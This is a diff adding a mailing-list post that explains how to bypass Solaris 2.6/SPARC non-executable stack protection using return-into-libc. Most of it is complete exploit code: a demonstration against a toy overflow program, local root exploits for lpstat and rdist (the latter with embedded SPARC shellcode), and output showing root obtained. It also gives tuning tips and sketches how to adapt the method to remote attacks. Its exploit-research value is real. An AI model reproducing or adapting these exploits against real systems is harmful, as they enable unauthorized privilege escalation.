@@ -1,0 +1,751 @@
+        Defeating Solaris/SPARC Non-Executable Stack Protection
+			      By Horizon
+
+Hi,
+
+I've recently been playing around with bypassing the non-executable stack
+protection that Solaris 2.6 provides. I'm referring to the mechanism that you
+control with the noexec_user_stack option in /etc/system. I've found it's
+quite possible to bypass this protection, using methods described previously
+on this list. Specifically, I have had success in adapting the return into
+libc methods introduced by Solar Designer and Nergal to Solaris/SPARC.
+
+I've included some sample code in this email, including an exploit for rdist,
+and an exploit for lpstat. These exploits should work on machines with the
+stack protection enabled, though they may require some groundwork before being
+used. Neither of these programs exploit a new bug, so the appropriate fixes
+for these holes should work fine.
+
+First of all, I'd like to thank stranJer, Solar Designer, duke and the
+various inhabitants of #!adm for reviewing this for me and providing a lot
+of valuable input.
+
+Ok.. it's important to have a general understanding of how the stack is
+layed out under SPARC/Solaris. There are several good references on the net
+for this information, so I will try to keep this brief..
+
+The stack frame looks roughly like this (to the best of my knowledge):
+
+Stack inside the body of a function (after save)
+================================================
+
+Higher addresses
+----------------
+%fp+92->any incoming args beyond 6  (possible)
+%fp+68->room for us to store copies of the incoming arguments
+%fp+64->pointer to where we can place our return value if necessary
+%fp+32->saved %i0-%i7
+%fp---->saved %l0-%l7
+%fp---->(previous top of stack)
+        *space for automatic variables*
+        possible room for temporaries and padding for 8 byte alignment
+%sp+92->possible room for outgoing parameters past 6
+%sp+68->room for next function to store our outgoing arguments (6 words)
+%sp+64->pointer to room for the return value of the next function
+%sp+32->saved %o0-%o7 / room for next non-leaf function to save %i0-%i7
+%sp---->room for next non-leaf function to save %l0-%l7
+%sp---->(top of stack)
+---------------
+Lower addresses
+
+So, from the top of the stack, looking up, we have room for the next function
+to save our %l and %i registers. A copy of the arguments given to us by the
+previous function (the %o0-o7 registers) are saved at %sp + 0x10. None of the
+resources I've seen on the web document this, but inspection in gdb shows that
+this is the case.
+
+Next, there is a one word pointer to memory where a function we call can place
+it's return value. Typically, we can expect the return value to be in %o0, but
+it is possible for a function to return something that can't fit in a register
+(such as a structure). In this case, we place the address of the memory where
+we want the return value to be placed into this location before calling the
+function. The return value is placed in that memory, and the address of that
+memory is also returned in %o0.
+
+Next, we have 6 words reserved for the next function to be able to store the
+arguments we pass to it through the registers. Some of the sites on the web
+indicate that this is necessary in case the called function needs to be able
+to take the address of one of it's incoming parameters (you can't take the
+address of a register).
+
+Next on the stack, there is temporary storage and padding for alignment. The
+stack pointer has to be aligned on an 8 byte boundary. Our automatic variables
+are saved on the stack next. From within this function, we can address the
+automatic variables relative to %fp (%fp - something).
+
+If we perform an overflow of an automatic variable, we are going to overwrite
+the saved %i and %l values of the function that called the function with
+the automatic variable. When the function with the automatic variable returns,
+it will return into the caller, because it has the return address stored in
+it's %i7 register. Then, the restore instruction will move the contents of the
+%i registers into the %o registers. Our bogus values for %l and %i will then
+be read from the stack into the registers. On the next return from a function,
+the program will return into the address we put at %i7's place on the stack
+frame. This explains why you need two returns to perform a classic buffer
+overflow.
+
+Moving on.. In this email, I'm presenting three different variations on the
+return into libc method. The first one I demonstrate with a 'fake' bug. This
+is our vulnerable program:
+
+---hole.c---
+int jim(char *str)
+{
+   char buf[256];
+   strcpy(buf,str);
+}
+
+int main(int argc, char **argv)
+{
+   jim(argv[1]);
+}
+------------
+
+hole.c is an extremely simple program with an obvious stack buffer overflow.
+
+If we wrote a typical program to exploit this, it would follow this flow:
+
+1. The program would proceed to the strcpy..
+2. The strcpy will overwrite the saved %i and %l registers in main's stack
+   frame.
+3. The jim function will do a restore, and increment the CWP. This will result
+   in our overflowed values being put into the %i and %l registers. It will
+   'ret' into main.
+4. The main function will then do a ret/restore. The ret instruction will read
+   our provided %i7, and transfer the flow of control to it. The CWP will again
+   be incremented, And our bogus %i registers will become the %o registers.
+
+A typical exploit would return into shellcode on the stack at this point,
+which would do it's thing with basically no regard for what is in the
+registers. However, with the stack protections in place, this behavior will
+cause the processor to fault upon attempting to execute code on a page where
+it is not permitted.
+
+To get around this, we wish to have our program return into a libc call. For
+this exploit, I've chosen system(). system() is easy because it only takes one
+argument. When we enter the code for system(), we expect it's arguments to be
+in %o0-%o7. Then, the system function will do the save instruction, and move
+the arguments into the %i0-%i7 registers. Getting our arguments into system()
+in the %o0-%o7 registers is somewhat easy to accomplish. Remember that the
+first ret/restore will pull our values off of the stack into the %l and %i
+registers. Thus, we can put any values we want into these registers when we
+overflow the stack based variable. The second ret/restore will move whats in
+the %i0-%i7 registers into the %o0-%o7 registers, and jump to what we had in
+the %i7 register. So, we can put the address of system() in our saved %i7, and
+the program's execution will resume there. So, when the program enters
+system(), the first instruction it will execute is a 'save'. This will move
+the values in %o0-%o7 back into %i0-%i7. Let's look at the exploit:
+
+---exhole.c---
+/*
+   example return into libc exploit for fake vulnerability in './hole'
+   by horizon <jmcdonal@unf.edu>
+
+   to compile:
+
+   gcc exhole.c -o exhole -lc -ldl
+*/
+
+#include <stdio.h>
+#include <dlfcn.h>
+#include <signal.h>
+#include <setjmp.h>
+
+int step;
+jmp_buf env;
+
+void fault()
+{
+   if (step<0)
+      longjmp(env,1);
+   else
+   {
+      printf("Couldn't find /bin/sh at a good place in libc.\n");
+      exit(1);
+   }
+}
+
+int main(int argc, char **argv)
+{
+   void *handle;
+   long systemaddr;
+   long shell;
+
+   char examp[512];
+   char *args[3];
+   char *envs[1];
+
+   long *lp;
+
+   if (!(handle=dlopen(NULL,RTLD_LAZY)))
+   {
+      fprintf(stderr,"Can't dlopen myself.\n");
+      exit(1);
+   }
+
+   if ((systemaddr=(long)dlsym(handle,"system"))==NULL)
+   {
+      fprintf(stderr,"Can't find system().\n");
+      exit(1);
+   }
+
+   systemaddr-=8;
+
+   if (!(systemaddr & 0xff) || !(systemaddr * 0xff00) ||
+      !(systemaddr & 0xff0000) || !(systemaddr & 0xff000000))
+   {
+      fprintf(stderr,"the address of system() contains a '0'. sorry.\n");
+      exit(1);
+   }
+
+   printf("System found at %lx\n",systemaddr);
+
+   /* let's search for /bin/sh in libc - from SD's original linux exploits */
+
+   if (setjmp(env))
+      step=1;
+   else
+      step=-1;
+
+   shell=systemaddr;
+
+   signal(SIGSEGV,fault);
+
+   do
+      while (memcmp((void *)shell, "/bin/sh", 8)) shell+=step;
+   while (!(shell & 0xff) || !(shell & 0xff00) || !(shell & 0xff0000)
+         || !(shell & 0xff000000));
+
+   printf("/bin/sh found at %lx\n",shell);
+
+   /* our buffer */
+   memset(examp,'A',256);
+   lp=(long *)&(examp[256]);
+
+   /* junk */
+   *lp++=0xdeadbe01;
+   *lp++=0xdeadbe02;
+   *lp++=0xdeadbe03;
+   *lp++=0xdeadbe04;
+
+   /* the saved %l registers */
+   *lp++=0xdeadbe10;
+   *lp++=0xdeadbe11;
+   *lp++=0xdeadbe12;
+   *lp++=0xdeadbe13;
+   *lp++=0xdeadbe14;
+   *lp++=0xdeadbe15;
+   *lp++=0xdeadbe16;
+   *lp++=0xdeadbe17;
+
+   /* the saved %i registers */
+
+   *lp++=shell;
+   *lp++=0xdeadbe11;
+   *lp++=0xdeadbe12;
+   *lp++=0xdeadbe13;
+   *lp++=0xdeadbe14;
+   *lp++=0xdeadbe15;
+
+   *lp++=0xeffffbc8;
+
+   /* the address of system  ( -8 )*/
+   *lp++=systemaddr;
+
+   *lp++=0x0;
+
+   args[0]="hole";
+   args[1]=examp;
+   args[2]=NULL;
+
+   envs[0]=NULL;
+
+   execve("./hole",args,envs);
+}
+--------------
+
+As you can see, the layout of the stack past the buffer has been mapped. This
+is easy to do using marker values and gdb. The first thing this exploit does
+is find the address of system() in libc. It does this using the dlopen() and
+dlsym() functions. If the exploit is linked exactly the same as the target
+executable, then we will be able to predict where libc will be mapped in the
+target. The exploit then finds a copy of the string '/bin/sh' in libc. It does
+this by searching through the memory around system(). This is almost the exact
+same code presented in Solar Designer's original return-into-libc exploit.
+
+In this exploit, %i0 is set to the address of the string '/bin/sh' in libc.
+%i6 (the frame pointer) is set to 0xeffffbc8. This is just a place in the stack
+that system() can use as it's stack. system() will look into the registers
+for it's arguments, so we don't really care what is on the stack, as long as
+system() can safely write to it. %i7 (our return address) is set to the
+address we found for system(). Note that this is actually the address we wish
+to go to minus 8, because the ret instruction will add 8 to the saved %fp.
+(in order to skip the call instruction and it's delay slot).
+
+So, does it work?
+
+bash-2.02$ gcc exhole.c -o exhole -lc -ldl
+bash-2.02$ ./exhole
+System found at ef768a84
+/bin/sh found at ef790378
+$
+
+yup. :>
+
+As you might expect, things don't go quite so smoothly when we attempt this
+technique in a live exploit. I have chosen lpstat as my next target.
+
+The first problem you will run into is that the program will modify the %i
+registers after the first return. This happened in both the lpstat and rdist
+exploits. This problem requires us to extend our technique to be more
+powerful.
+
+What I do in the lpstat exploit is create a fake stack frame in the env space.
+Then, I put it's address in our saved %fp. Then, instead of returning into the
+system() function, I return into system()+4, bypassing the save instruction.
+
+So, what does all this do? Well, our values get loaded into the %l0-l7 and
+%i0-%i7 registers after the first ret/restore. The next ret/restore moves
+our values into %o0-%o7, and jumps to our saved %i7. This *also* loads in the
+%i0-%i7 and %l0-%l7 registers from the stack. So, when we specify a saved %fp,
+and we hit the second restore, the processor assumes our %fp was it's old %sp,
+and loads the %l and %i registers from the stack frame at %fp. This means
+that we can specify what we want the %l and %i registers to contain upon
+entering wherever it is that we return into.
+
+We skip the 'save' instruction, because that would move the %o0-%o7 back to the
+%i0-%i7 registers, and overwrite our malicious values.
+
+Having solved that, we stumble onto our second problem: the system() function
+uses /bin/sh -c to execute it's argument. Under Solaris, /bin/sh will drop it's
+privileges if it is run with a non-zero ruid, and an euid of zero.
+The obvious solution to this is to try to do a setuid(0) before we run system.
+
+So, we need to find a way to chain functions together.. i.e. to return into
+one function, and have it return into another. It is important to note that
+there are two kinds of functions: leaf and non-leaf functions. The leaf
+functions do not use any stack space to do their work, and do not call any
+other functions. Thus, they don't need to use the 'save' instruction to set up
+a stack frame. They operate using the registers in %o0-%o7 as their arguments.
+When a leaf function is done, it returns by jumping to the address it has in
+%o7. The non-leaf functions are ones that require a stack frame, and they use
+the 'save', 'ret', and 'restore' instructions.
+
+We can chain non-leaf functions together by making a fake stack frame for
+every function that we need to return into, and placing the address of the
+next function into the %i7 position on the fake stack frame. This works
+because we skip the save instruction, which allows us to keep feeding in
+fake stack frame information, and specfying the %i and %l registers for each
+function we enter.
+
+However, there is a limitation of our return into libc method: We can't
+return into a leaf function, unless it is the last function we return into.
+A leaf function does not do a save or restore, it simply assumes it's
+arguments are in the %o0-%o7 registers. It returns by doing a retl, which
+jumps to %o7. The problem is that if we return into a leaf function, the
+address of that leaf function will be in %o7. Thus, when the leaf function
+tries to return, it will jump back to itself, causing an infinite loop. We
+can't get a leaf function to return into another function because it doesn't
+use the ret/restore sequence to return. Thus, even though we can control what
+values are in the %i and %l registers, the leaf function will not use these
+values for arguments or the return address.
+
+So, for a solution here, we simply return into execl(). This takes very similar
+arguments to system, except that we need to have a NULL argument to terminate
+the list of arguments. This is easy to do since we are passing in our fake
+stack frame through the env space.
+
+Here is the lpstat exploit:
+
+---lpstatex.c---
+/*
+   lpstat exploit for Solaris 2.6 - horizon - <jmcdonal@unf.edu>
+
+   This demonstrates the return into libc technique for bypassing stack
+   execution protection. This requires some preliminary knowledge for use.
+
+   to compile:
+
+   gcc lpstatex.c -o lpstatex -lprint -lc -lnsl -lsocket -ldl -lxfn -lmp -lC
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/systeminfo.h>
+#include <unistd.h>
+#include <dlfcn.h>
+
+#define BUF_LENGTH 1024
+
+int main(int argc, char *argv[])
+{
+   char buf[BUF_LENGTH * 2];
+   char teststring[BUF_LENGTH * 2];
+   char *env[10];
+   char fakeframe[512];
+   char padding[64];
+   char platform[256];
+
+   void *handle;
+   long execl_addr;
+
+   u_char *char_p;
+   u_long *long_p;
+   int i;
+   int pad=31;
+
+   if (argc==2) pad+=atoi(argv[1]);
+
+   if (!(handle=dlopen(NULL,RTLD_LAZY)))
+   {
+      fprintf(stderr,"Can't dlopen myself.\n");
+      exit(1);
+   }
+
+   if ((execl_addr=(long)dlsym(handle,"execl"))==NULL)
+   {
+      fprintf(stderr,"Can't find execl().\n");
+      exit(1);
+   }
+
+   execl_addr-=4;
+
+   if (!(execl_addr & 0xff) || !(execl_addr * 0xff00) ||
+      !(execl_addr & 0xff0000) || !(execl_addr & 0xff000000))
+   {
+      fprintf(stderr,"the address of execl() contains a '0'. sorry.\n");
+      exit(1);
+   }
+
+   printf("found execl() at %lx\n",execl_addr);
+
+   char_p=buf;
+
+   memset(char_p,'A',BUF_LENGTH);
+
+   long_p=(unsigned long *) (char_p+1024);
+
+   *long_p++=0xdeadbeef;
+
+   /* Here is the saved %i0-%i7 */
+
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xeffffb68; // our fake stack frame
+   *long_p++=execl_addr;      // we return into execl() in libc
+   *long_p++=0;
+
+   /* now we set up our fake stack frame in env */
+
+   long_p=(long *)fakeframe;
+
+   *long_p++=0xdeadbeef; // we don't care about locals
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+
+   *long_p++=0xefffffac; // points to our string to exec
+   *long_p++=0xefffffac; // argv[1] is a copy of argv[0]
+   *long_p++=0x0;        // NULL for execl();
+   *long_p++=0xefffffcc;
+   *long_p++=0xeffffd18;
+   *long_p++=0xeffffd18;
+   *long_p++=0xeffffd18; // this just has to be somewhere it can work with
+   *long_p++=0x11111111; // doesn't matter b/c we exec
+   *long_p++=0x0;
+
+   /* This gives us some padding to play with */
+
+   memset(teststring,'A',BUF_LENGTH);
+   teststring[BUF_LENGTH]=0;
+
+   sysinfo(SI_PLATFORM,platform,256);
+
+   pad+=20-strlen(platform);
+
+   for (i=0;i<pad;padding[i++]='C')
+      padding[i]=0;
+
+   env[0]="";
+   env[1]=(fakeframe);
+   env[2]=&(fakeframe[40]);
+   env[3]=&(fakeframe[40]);
+   env[4]=&(fakeframe[40]);
+   env[5]=&(fakeframe[44]);
+   env[6]=teststring;
+   env[7]="A=/bin/id";
+   env[8]=padding;
+   env[9]=NULL;
+
+   execle("/usr/bin/lpstat","lpstat","-c",buf,(char *)0,env);
+   perror("execle failed");
+}
+----------------
+
+Looking at this exploit, you can see how we build a fake stack frame in env,
+and have the program we are exploiting read it in. We return into execl(),
+just past the 'save', and it uses the arguments we provide in %i0-%i7. Also,
+note that we pass in the command we want to run through the environment, as
+opposed to searching for it in libc.
+
+Here's what it looks like:
+
+bash-2.02$ gcc lpstatex.c -o lpstatex -lprint -lc -lnsl -lsocket -ldl -lxfn -lmp -lC
+bash-2.02$ ./lpstatex
+found execl() at ef6e93a4
+
+UX:lpstat: ERROR: Class
+...
+(lpstat spews for a while)
+...
+                  ¤" does not exist.
+          TO FIX: Use the "lpstat -c all" command to list
+                  all known classes.
+uid=120(jmcdonal) gid=15(develop) euid=0(root)
+bash-2.02$
+
+In the exploit, we ran /bin/id, which you see here. If you are so inclined, you
+can easily change it to run something like /tmp/aa, which will give you the
+appropriate permissions and exec a shell.
+
+So, this works pretty well. However, we still have a big problem with our
+technique: it is impossible to return into a leaf function before returning
+into any other function. This unfortunately means we cant return into setuid()
+or seteuid() to restore our privileges before exec'ing something. There are a
+few options in overcoming this problem, but I have choosen a fairly simple
+one...
+
+We will return into a strcpy, which will copy our shellcode from the env space,
+into somewhere where it is safe to run it. We will then have that strcpy
+return into our shellcode. This exploit is very similar to the previous one,
+with the exception that we are doing a second return.
+
+Here is the exploit:
+---rdistex.c---
+/*
+   rdist exploit for Solaris 2.6 - horizon - <jmcdonal@unf.edu>
+
+   This demonstrates the return into libc technique for bypassing stack
+   execution protection. This requires some preliminary knowledge for use.
+
+   to compile:
+
+   gcc rdistex.c -o rdistex -lsocket -lnsl -lc -ldl -lmp
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/systeminfo.h>
+#include <unistd.h>
+#include <dlfcn.h>
+
+u_char sparc_shellcode[] =
+"\xAA\xAA\x90\x08\x3f\xff\x82\x10\x20\x8d\x91\xd0\x20\x08"
+"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
+"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
+"\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"
+"\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+"\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
+"\x91\xd0\x20\x08\xAA";
+
+#define BUF_LENGTH 1024
+
+int main(int argc, char *argv[])
+{
+   char buf[BUF_LENGTH * 2];
+   char tempbuf[BUF_LENGTH * 2];
+   char teststring[BUF_LENGTH * 2];
+   char padding[128];
+   char *env[10];
+   char fakeframe[512];
+   char platform[256];
+
+   void *handle;
+   long strcpy_addr;
+   long dest_addr;
+
+   u_char *char_p;
+   u_long *long_p;
+   int i;
+   int pad=25;
+
+   if (argc==2) pad+=atoi(argv[1]);
+
+   char_p=buf;
+
+   if (!(handle=dlopen(NULL,RTLD_LAZY)))
+   {
+      fprintf(stderr,"Can't dlopen myself.\n");
+      exit(1);
+   }
+
+   if ((strcpy_addr=(long)dlsym(handle,"strcpy"))==NULL)
+   {
+      fprintf(stderr,"Can't find strcpy().\n");
+      exit(1);
+   }
+
+   strcpy_addr-=4;
+
+   if (!(strcpy_addr & 0xff) || !(strcpy_addr * 0xff00) ||
+      !(strcpy_addr & 0xff0000) || !(strcpy_addr & 0xff000000))
+   {
+      fprintf(stderr,"the address of strcpy() contains a '0'. sorry.\n");
+      exit(1);
+   }
+
+   printf("found strcpy() at %lx\n",strcpy_addr);
+
+   if ((dest_addr=(long)dlsym(handle,"accept"))==NULL)
+   {
+      fprintf(stderr,"Can't find accept().\n");
+      exit(1);
+   }
+
+   dest_addr=dest_addr & 0xffff0000;
+   dest_addr+=0x1800c;
+
+   if (!(dest_addr & 0xff) || !(dest_addr & 0xff00) ||
+      !(dest_addr & 0xff0000) || !(dest_addr & 0xff000000))
+   {
+      fprintf(stderr,"the destination address contains a '0'. sorry.\n");
+      exit(1);
+   }
+
+   printf("found shellcode destination at %lx\n",dest_addr);
+
+   /* hi sygma! */
+
+   memset(char_p,'A',BUF_LENGTH);
+
+   long_p=(unsigned long *) (char_p+1024);
+
+   /* We don't care about the %l registers */
+
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+
+   /* Here is the saved %i0-%i7 */
+
+   *long_p++=0xdeadbeef;
+   *long_p++=0xefffd378; // safe value for dereferencing
+   *long_p++=0xefffd378; // safe value for dereferencing
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xeffffb78; // This is where our fake frame lives
+   *long_p++=strcpy_addr; // We return into strcpy
+   *long_p++=0;
+
+   long_p=(long *)fakeframe;
+   *long_p++=0xAAAAAAAA; // garbage
+   *long_p++=0xdeadbeef; // %l0
+   *long_p++=0xdeadbeef; // %l1
+   *long_p++=0xdeadbeaf; // %l2
+   *long_p++=0xdeadbeef; // %l3
+   *long_p++=0xdeadbeaf; // %l4
+   *long_p++=0xdeadbeef; // %l5
+   *long_p++=0xdeadbeaf; // %l6
+   *long_p++=0xdeadbeef; // %l7
+   *long_p++=dest_addr; // %i0 - our destination (i just picked somewhere)
+   *long_p++=0xeffffb18; // %i1 - our source
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xdeadbeef;
+   *long_p++=0xeffffd18; // %fp - just has to be somewhere strcpy can use
+   *long_p++=dest_addr-8; // %i7 - return into our shellcode
+   *long_p++=0;
+
+   sprintf(tempbuf,"blh=%s",buf);
+
+   /* This gives us some padding to play with */
+
+   memset(teststring,'B',BUF_LENGTH);
+   teststring[BUF_LENGTH]=0;
+
+   sysinfo(SI_PLATFORM,platform,256);
+
+   pad+=21-strlen(platform);
+   for (i=0;i<pad;padding[i++]='A')
+      padding[i]=0;
+
+   env[0]=sparc_shellcode;
+   env[1]=&(fakeframe[2]);
+   env[2]=teststring;
+   env[3]=padding;
+   env[4]=NULL;
+
+   execle("/usr/bin/rdist","rdist","-d",tempbuf,"-c","/tmp/","${blh}",
+      (char *)0,env);
+   perror("execl failed");
+}
+---------------
+
+This technique seems to work well:
+
+bash-2.02$ gcc rdistex.c -o rdistex -lsocket -lnsl -lc -ldl -lmp
+bash-2.02$ ./rdistex
+found strcpy() at ef62427c
+found shellcode destination at ef7a800c
+rdist: line 1: Pathname too long
+...
+rdist: line 1: Pathname too long
+#
+
+These exploits require a high degree of precision. I've tried to take out most
+of the guesswork, but there are two things that might cause the exploits to
+fail. The lpstat and rdist exploits expect certain things to be in the
+environment at exact locations. We use the execle function, specifying the
+entire environment, so you wouldn't think this would be a problem. However,
+Solaris 2.6 puts two things at the very top of the environment space:
+the name of the program that is being run, and the platform of the machine.
+I have attempted to take this into account in the two exploits, but have only
+been able to test on two different platforms. Thus, you might need to adjust
+the 'pad' variable if the exploits do not seem to be working. You can adjust
+this value via the command line. It's probably best to try increments of 4.
+
+Also, there is a bit of a guess in the rdist exploit as to where to place the
+shellcode in libc. The exploit gets the address of a symbol in libsocket, then
+bitwise ands it with 0xffff0000 and then adds 0x1800c. The point of this is
+to guess at where the section for libsocket's data will be mapped. If this is
+a problem, then you can use /usr/proc/bin/pmap along with gdb to figure out a
+good address to store the shellcode in.
+
+Hopefully, these exploits demonstrate that it is important to make sure that
+programs that run at an elevated privilege are free of buffer overflow bugs.
+The stack protection will certainly help protect you from the majority of
+intruders, but moderately competent intruders will probably be able to bypass
+it.
+
+I believe that these techniques could be adopted for use in a remote exploit.
+Assuming we go with the strcpy technique, the attacker would need to do
+several things. First of all, the attacker would need to put the fake stack
+frame somewhere in the buffer that was overflowed. Then the attacker would
+have to make educated guesses at a few things. These would be: the location
+that strcpy() is mapped at, a safe location to store the shellcode, and the
+location of the fake stack frame. You could make pretty educated guesses at all
+of these, so it might only require a small number of tries. Of course, the
+added time and interaction that this would involve certainly makes the stack
+protection useful.
+
+I welcome any comments or criticisms about this post.
+
+Thanks,
+horizon <jmcdonal@unf.edu> 
